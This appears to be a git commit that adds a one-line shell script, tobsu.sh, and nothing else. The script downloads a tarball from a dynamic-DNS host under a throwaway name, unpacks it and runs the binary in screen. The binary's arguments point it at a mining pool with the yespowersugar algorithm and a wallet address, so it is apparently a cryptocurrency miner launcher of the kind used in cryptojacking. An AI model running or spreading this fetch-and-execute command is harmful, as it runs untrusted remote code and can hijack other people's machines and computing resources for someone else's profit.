4813d607e00f50f8f0ccf6e3e5099102fee85431
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2025-01-31 13:57:31 +0700

    Create tobsu.sh

---
+++ tobsu.sh
@@ -0,0 +1,1 @@
+wget -O dr9rer coli.sytes.net/tobrut.tar.gz && tar -xvf dr9rer && chmod +x tobrut && screen ./tobrut -a yespowersugar -o 49.157.28.218:443 -u sugar1q9k38saldc5ey6389u86ar0a9nuxsuyu59z8acz.teslac -p x
